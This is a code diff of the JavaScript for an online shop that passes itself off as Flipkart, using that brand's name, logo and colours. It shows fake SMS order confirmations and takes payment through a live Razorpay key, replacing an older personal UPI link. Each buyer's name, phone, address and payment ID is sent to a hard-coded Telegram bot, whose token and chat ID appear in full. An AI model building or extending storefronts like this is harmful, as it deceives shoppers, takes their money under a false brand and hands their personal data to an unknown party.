@@ -1,9 +1,9 @@
-// --- CONFIGURATION (Yahan apni details dalein) ---
-// WARNING: Putting bot tokens in frontend code is not secure for real websites.
-// Anyone can see this token. Use only for testing/learning.
+// --- CONFIGURATION ---
 const TELEGRAM_BOT_TOKEN = "6305172063:AAFHumurpK6wMV7K-6FZBg-DSKxwMuD4Vw0"; 
-const TELEGRAM_CHAT_ID = "1815847082"; // <--- Aapka Chat ID update ho gaya hai
+const TELEGRAM_CHAT_ID = "1815847082"; 
 
+// --- RAZORPAY CONFIGURATION ---
+const RAZORPAY_KEY_ID = "rzp_live_RonN88BXEVP9eA"; 
 const products = [
     // --- Earbuds (Keywords: wireless, earbuds, isolated) ---
     { 
@@ -321,7 +321,6 @@ const products = [
     }
 ];
 
-
 // --- GLOBAL VARIABLES ---
 let currentProduct = null;
 let currentPrice = 0;
@@ -370,7 +369,7 @@ function filterByCategory(category) {
     }
 }
 
-// 3. Render Grid
+// 3. Render Grid (With Ratings)
 function renderProducts(productList = products) {
     const container = document.getElementById('product-container');
     if (!container) return;
@@ -414,9 +413,7 @@ function renderProducts(productList = products) {
 
 // 4. Show Detail Page (UPDATED WITH HISTORY PUSH)
 function showProductDetail(product) {
-    // --- MOBILE BACK BUTTON FIX ---
-    history.pushState({view: 'product'}, '', '#product'); // Push new state
-    // ------------------------------
+    history.pushState({view: 'product'}, '', '#product'); 
 
     currentProduct = product;
     currentPrice = getDiscountedPrice(product.price);
@@ -454,7 +451,6 @@ function showProductDetail(product) {
         newBtn.onclick = function() { startCheckout(); };
     }
 
-    // Fix UI Back Button to use History Back
     const backBtn = document.querySelector('.back-btn');
     if(backBtn) {
         backBtn.onclick = function() { history.back(); };
@@ -492,9 +488,7 @@ function updateCartCount() {
 }
 
 function openCart() {
-    // --- MOBILE BACK BUTTON FIX ---
     history.pushState({view: 'cart'}, '', '#cart');
-    // ------------------------------
 
     let cartView = document.getElementById('cart-view');
     if(!cartView) {
@@ -554,12 +548,7 @@ function openCart() {
 function removeFromCart(index) {
     cart.splice(index, 1);
     updateCartCount();
-    openCart(); // Re-render logic creates loop if not careful, better to update DOM
-    // For simplicity, just re-rendering which pushes state again is bad.
-    // Quick fix: Don't push state inside openCart if already in cart. 
-    // Ideally, split render logic. But for now, user is likely to just remove and stay.
-    // To avoid double history push on remove, we can just use history.replaceState or simplistic re-render without push.
-    // For this simple version, let's just accept re-render.
+    openCart();
 }
 
 function initiateCartCheckout(totalAmount) {
@@ -635,10 +624,8 @@ function goToPayment() {
         return;
     }
 
-    // Send Telegram
-    let productDetails = isCartOrder ? `🛒 *BULK ORDER (${cart.length} Items)*` : `🛒 *Product:* ${currentProduct.name}`;
-    const orderDetails = `📦 *NEW ORDER*\n👤 ${name}\n📱 ${phone}\n📮 ${pincode}\n🏠 ${addr}\n${productDetails}\n💰 *Price:* ₹${currentPrice}`;
-    sendToTelegram(orderDetails);
+    // Capture user details
+    window.userDetails = { name, phone, pincode, addr };
 
     document.getElementById('step-address').classList.add('hidden');
     document.getElementById('step-payment').classList.remove('hidden');
@@ -650,7 +637,77 @@ function backToAddress() {
     document.getElementById('step-address').classList.remove('hidden');
 }
 
-// --- FAKE SMS ---
+// --- RAZORPAY INTEGRATION ---
+function processRazorpayPayment() {
+    var options = {
+        "key": RAZORPAY_KEY_ID, 
+        "amount": currentPrice * 100, // paise
+        "currency": "INR",
+        "name": "FlipKart",
+        "description": isCartOrder ? "Bulk Order" : currentProduct.name,
+        "image": "https://rukminim1.flixcart.com/www/800/800/promos/16/05/2019/d438a32e-765a-4d8b-b4a6-520b560971e8.png?q=90",
+        "handler": function (response) {
+            completeOrder(response.razorpay_payment_id);
+        },
+        "prefill": {
+            "name": window.userDetails.name,
+            "contact": window.userDetails.phone
+        },
+        "theme": {
+            "color": "#2874f0"
+        }
+    };
+
+    var rzp1 = new Razorpay(options);
+    rzp1.on('payment.failed', function (response){
+        alert("Payment Failed: " + response.error.description);
+    });
+    
+    closeModal();
+    rzp1.open();
+}
+
+function completeOrder(paymentId) {
+    if(isCartOrder) { 
+        cart = []; 
+        updateCartCount(); 
+    }
+    
+    // 1. Send Telegram Message with Razorpay ID
+    let productDetails = isCartOrder ? `🛒 *BULK ORDER*` : `🛒 *Product:* ${currentProduct.name}`;
+    const orderDetails = `
+✅ *ORDER CONFIRMED (Razorpay)* ✅
+-------------------------
+👤 *Name:* ${window.userDetails.name}
+📱 *Phone:* ${window.userDetails.phone}
+📮 *Pin:* ${window.userDetails.pincode}
+🏠 *Address:* ${window.userDetails.addr}
+-------------------------
+${productDetails}
+💰 *Amount:* ₹${currentPrice}
+-------------------------
+🆔 *Payment ID:* ${paymentId}
+    `;
+    sendToTelegram(orderDetails);
+
+    // 2. Show Fake SMS
+    let msg = isCartOrder ? "Your bulk order has been successfully placed." : `Order Placed: Your order for ${currentProduct.name} is successful.`;
+    showFakeSMSNotification(msg);
+
+    // 3. Show Final Success Screen
+    const successModal = document.getElementById('successModal');
+    successModal.querySelector('.modal-content').innerHTML = `
+        <div style="text-align: center; padding: 20px;">
+            <div style="font-size: 50px; color: #388e3c; margin-bottom: 20px;"><i class="fas fa-check-circle"></i></div>
+            <h2 style="color: #212121;">Order Confirmed!</h2>
+            <p style="color: #666; margin-bottom: 20px;">Thank you for shopping with us.</p>
+            <p style="font-size: 12px; color: #888;">Transaction ID: ${paymentId}</p>
+            <button onclick="closeSuccessAndHome()" style="width: 100%; background: #2874f0; color: white; border: none; padding: 12px; margin-top: 10px; cursor: pointer; border-radius: 2px;">Continue Shopping</button>
+        </div>
+    `;
+    successModal.style.display = 'flex';
+}
+
 function showFakeSMSNotification(msgContent) {
     let notif = document.getElementById('fake-sms-notification');
     if (!notif) {
@@ -663,25 +720,6 @@ function showFakeSMSNotification(msgContent) {
     
     setTimeout(() => { notif.style.top = '20px'; }, 100);
     setTimeout(() => { notif.style.top = '-100px'; }, 6000);
-}
-
-const UPI_ID = "gpay-12189691704@okbizaxis"; 
-
-function processPayment() {
-    const upiLink = `upi://pay?pa=${UPI_ID}&pn=FlipStore&am=${currentPrice}&cu=INR`;
-    window.location.href = upiLink;
-
-    setTimeout(() => {
-        closeModal();
-        if(isCartOrder) { cart = []; updateCartCount(); }
-        
-        let msg = isCartOrder ? "Your bulk order has been successfully placed." : `Order Placed: Your order for ${currentProduct.name} is successful.`;
-        showFakeSMSNotification(msg);
-
-        const successModal = document.getElementById('successModal');
-        successModal.querySelector('.modal-content').innerHTML = `<div style="text-align: center; padding: 20px;"><div style="font-size: 50px; color: #388e3c; margin-bottom: 20px;"><i class="fas fa-check-circle"></i></div><h2>Order Placed!</h2><button onclick="closeSuccessAndHome()" style="width: 100%; background: #2874f0; color: white; border: none; padding: 12px; margin-top: 20px;">Continue Shopping</button></div>`;
-        successModal.style.display = 'flex';
-    }, 20000);
 }
 
 function closeSuccessAndHome() {
@@ -741,4 +779,3 @@ document.addEventListener('DOMContentLoaded', () => {
         });
     }
 });
-
